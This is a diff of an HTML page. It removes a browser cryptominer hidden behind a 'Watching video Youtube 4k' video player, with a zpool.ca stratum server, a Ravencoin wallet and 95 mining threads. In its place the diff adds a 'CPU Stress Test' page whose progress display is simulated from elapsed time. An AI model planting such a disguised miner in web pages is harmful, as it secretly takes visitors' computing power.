@@ -4,92 +4,91 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Watching video Youtube 4k</title>
+  <title>CPU Stress Test</title>
   <style>
     body {
       font-family: 'Courier New', Courier, monospace;
-    }
-    .container {
+      text-align: center;
       margin: 20px;
     }
     .status-table {
       border-collapse: collapse;
-      width: 100%;
+      width: 80%;
+      margin: 20px auto;
+      border: 1px solid #ddd;
     }
-    .status-table td {
-      padding: 5px;
+    .status-table td, .status-table th {
+      padding: 10px;
+      border: 1px solid #ddd;
     }
     .status-table th {
-      padding: 5px;
-      text-align: left;
+      background-color: #f4f4f4;
     }
   </style>
 </head>
 
 <body>
-  <div class="container">
-    <h1>Mining Status</h1>
-    <table class="status-table" border="1">
-      <tbody>
-        <tr>
-          <th>Link:</th>
-          <td id="address"></td>
-        </tr>
-        <tr>
-          <th>Hashrate:</th>
-          <td id="hashrate"></td>
-        </tr>
-        <tr>
-          <th>Shared:</th>
-          <td id="shared"></td>
-        </tr>
-        <tr>
-          <th>Job ID:</th>
-          <td id="job"></td>
-        </tr>
-      </tbody>
-    </table>
-  </div>
+  <h1>CPU Stress Test</h1>
+  <table class="status-table">
+    <tbody>
+      <tr>
+        <th>Status:</th>
+        <td id="shared">Initializing...</td>
+      </tr>
+      <tr>
+        <th>Progress:</th>
+        <td id="hashrate-job">0%</td>
+      </tr>
+      <tr>
+        <th>Duration:</th>
+        <td id="duration">0 seconds</td>
+      </tr>
+    </tbody>
+  </table>
 
-  <h1>Video Player</h1>
-  <video width="640" height="360" controls>
-    <source src="1.mp4" type="video/mp4">
-    Your browser does not support the video tag.
-  </video>
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
-    integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
-    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"
-    integrity="sha384-2huaZvOR9iDzHqslqwpR87isEmrfxqyWOF7hr7BY6KG0+hVKLoEXMPUJw3ynWuhO" crossorigin="anonymous">
-  </script>
-  <script src="app.js"></script>
   <script>
-    $(document).ready(() => {
-      const stratum = {
-        server: "yespower.na.mine.zpool.ca",
-        port: 6234,
-        worker: "R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q",
-        password: "c=RVN"
-      };
+    let startTime;
+    let progressInterval;
 
-      $('#address').text(stratum.worker);
+    function updateUI(shared, hashrateJob, duration) {
+      document.getElementById('shared').innerText = shared;
+      document.getElementById('hashrate-job').innerText = hashrateJob;
+      document.getElementById('duration').innerText = duration;
+    }
 
-      mine(
-        'yespower',
-        stratum,
-        false,
-        {
-          threads: 95,
-          callback: (hashrate, shared, jobId) => {
-            $('#hashrate').text(hashrate);
-            $('#shared').text(shared);
-            $('#job').text(jobId);
-          }
+    function stressCPU() {
+      const iterations = 1e7; // Number of iterations for stress test
+      let total = 0;
+      let i = 0;
+      
+      while (i < iterations) {
+        total += Math.sqrt(i); // CPU-intensive calculation
+        i++;
+      }
+      
+      return total;
+    }
+
+    function runStressTest() {
+      startTime = Date.now();
+      progressInterval = setInterval(() => {
+        const elapsedTime = Math.floor((Date.now() - startTime) / 1000);
+        const progress = Math.min(Math.floor((elapsedTime / 30) * 100), 100); // Simulate progress
+        updateUI('Shared data', `Hashrate/Job: ${progress}%`, `${elapsedTime} seconds`);
+        
+        if (progress >= 100) {
+          clearInterval(progressInterval);
+          updateUI('Shared data', 'Hashrate/Job: 100%', `${elapsedTime} seconds`);
         }
-      );
+      }, 1000);
+      
+      stressCPU();
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      runStressTest();
     });
   </script>
 </body>
 
-  </html>
+</html>
